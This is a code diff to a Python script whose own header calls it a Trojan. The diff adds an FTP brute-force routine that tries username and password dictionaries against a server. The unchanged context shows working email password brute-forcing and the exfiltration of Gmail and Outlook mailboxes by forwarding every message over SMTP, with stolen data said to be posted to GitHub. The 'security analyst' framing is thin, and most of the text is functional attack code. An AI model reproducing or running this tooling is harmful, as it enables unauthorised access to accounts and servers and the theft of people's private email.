@@ -12,14 +12,14 @@
 # of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
 # and if that repository is public, all the extracted data will be available for the whole world to see.
 # Description of Script
-# This script is a versatile tool for performing various email-related tasks such as sending test 
-# emails, brute-forcing email passwords, and exfiltrating emails from both Gmail and Outlook accounts. 
-# It leverages Python libraries such as smtplib, imaplib, and win32com.client to interact with SMTP 
-# and IMAP servers for sending and fetching emails, as well as accessing Outlook emails specifically 
-# in a Windows environment. The script presents the user with an interactive menu, allowing them to 
-# choose from a range of options based on their desired action. An example use case would involve a 
-# security analyst assessing the security of an email system by attempting to send test emails, 
-# perform password brute-forcing, and exfiltrate emails from specified accounts for assessment.
+# This script is a comprehensive tool that offers a range of functionalities for email-related tasks 
+# and FTP brute forcing. It allows users to send test emails, brute force email passwords, and 
+# exfiltrate emails from both Gmail and Outlook accounts. Additionally, it enables users to perform 
+# FTP brute force attacks using provided username and password dictionaries. The script presents 
+# an interactive menu, guiding users through various options to choose the desired action. 
+# An example use case could involve a cybersecurity professional testing the security of an 
+# organization's email system and FTP server by attempting to brute force passwords and 
+# exfiltrate sensitive data.
 # Example output:
 # Please enter the server URL address here: smtp.example.com
 # Please enter the account address here: sender@example.com
@@ -30,7 +30,8 @@
 # 2. Brute force an email password
 # 3. Exfiltrate emails from a Gmail account
 # 4. Exfiltrate emails from an Outlook account (Windows only)
-# 5. Exit
+# 5. Brute force FTP server
+# 6. Exit
 # Option: 1
 # Please enter Test Subject Line here: Test Email
 # Please enter email content here: This is a test email for demonstration purposes.
@@ -40,26 +41,29 @@
 # 2. Brute force an email password
 # 3. Exfiltrate emails from a Gmail account
 # 4. Exfiltrate emails from an Outlook account (Windows only)
-# 5. Exit
-# Option: 3
-# Please enter the Gmail address to exfiltrate emails from: user@gmail.com
-# Please enter the password for the Gmail account: ********
-# Exfiltrating emails from Gmail account...
-# Emails exfiltrated successfully.
-
+# 5. Brute force FTP server
+# 6. Exit
+# Option: 5
+# Please enter FTP server address: ftp.example.com
+# Please enter the path to the username dictionary: usernames.txt
+# Please enter the path to the password dictionary: passwords.txt
+# FTP credentials found: Username - admin, Password - secret123
 # Choose an option:
 # 1. Send a test email
 # 2. Brute force an email password
 # 3. Exfiltrate emails from a Gmail account
 # 4. Exfiltrate emails from an Outlook account (Windows only)
-# 5. Exit
-# Option: 5
+# 5. Brute force FTP server
+# 6. Exit
+# Option: 6
 # Exiting...
 #################################################################################################
 import smtplib
 import imaplib
 import time
 import win32com.client  # Only for Windows environment
+import ftplib
+import os
 
 # Function to send plain text email
 def plain_email(subject, contents):
@@ -151,6 +155,32 @@ def exfiltrate_outlook():
     for message in messages:
         plain_email('Exfiltrated Outlook Email', message.Body)
 
+# Function to brute force FTP server with given usernames and passwords
+def brute_force_ftp(username_dict_path, password_dict_path, ftp_server):
+    """
+    Brute forces FTP server using provided username and password dictionaries.
+
+    Args:
+    username_dict_path (str): Path to the file containing usernames.
+    password_dict_path (str): Path to the file containing passwords.
+    ftp_server (str): FTP server address.
+    """
+    with open(username_dict_path) as users_file:
+        usernames = users_file.read().splitlines()
+    with open(password_dict_path) as passwords_file:
+        passwords = passwords_file.read().splitlines()
+
+    for username in usernames:
+        for password in passwords:
+            try:
+                ftp = ftplib.FTP(ftp_server)
+                ftp.login(username, password)
+                ftp.quit()
+                return username, password
+            except ftplib.error_perm:
+                continue
+    return None, None
+
 # Interactive menu function
 def menu():
     # Display menu options
@@ -159,7 +189,8 @@ def menu():
     print("2. Brute force an email password")
     print("3. Exfiltrate emails from a Gmail account")
     print("4. Exfiltrate emails from an Outlook account (Windows only)")
-    print("5. Exit")
+    print("5. Brute force FTP server")
+    print("6. Exit")
 
 if __name__ == '__main__':
     # User inputs for email server details
@@ -195,7 +226,19 @@ if __name__ == '__main__':
             exfiltrate_gmail(gmail_exfil_email, gmail_password)
         elif option == '4':  # Option to exfiltrate emails from an Outlook account (Windows only)
             exfiltrate_outlook()
-        elif option == '5':  # Option to exit the script
+        elif option == '5':  # Option to brute force FTP server
+            ftp_server = input("Please enter FTP server address: ")
+              # Prompt for the path to username and password dictionaries
+            username_dict_path = input("Please enter the path to the username dictionary: ")
+            password_dict_path = input("Please enter the path to the password dictionary: ")
+
+            # Perform FTP brute force
+            username, password = brute_force_ftp(username_dict_path, password_dict_path, ftp_server)
+            if username and password:
+                print(f"FTP credentials found: Username - {username}, Password - {password}")
+            else:
+                print("FTP credentials not found.")
+        elif option == '6':  # Option to exit the script
             print("Exiting...")
             break
         else:
